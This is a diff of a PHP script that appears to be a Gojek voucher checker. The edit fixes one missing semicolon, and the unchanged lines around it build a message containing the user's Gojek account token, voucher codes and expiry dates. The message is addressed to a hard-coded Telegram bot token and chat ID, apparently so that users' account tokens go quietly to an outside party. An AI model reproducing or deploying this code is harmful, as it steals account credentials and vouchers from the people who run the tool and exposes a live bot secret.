@@ -142,7 +142,7 @@ echo " ==========+++++++++==========\n";
         $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
         $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
         $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
-        $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7')
+        $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
         $TOKEN  = "833122415:AAGyUuqdPo4bNu8NQUozvAh9UIMG4py0hfQ";
 	$chatid = "782106563";
 	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
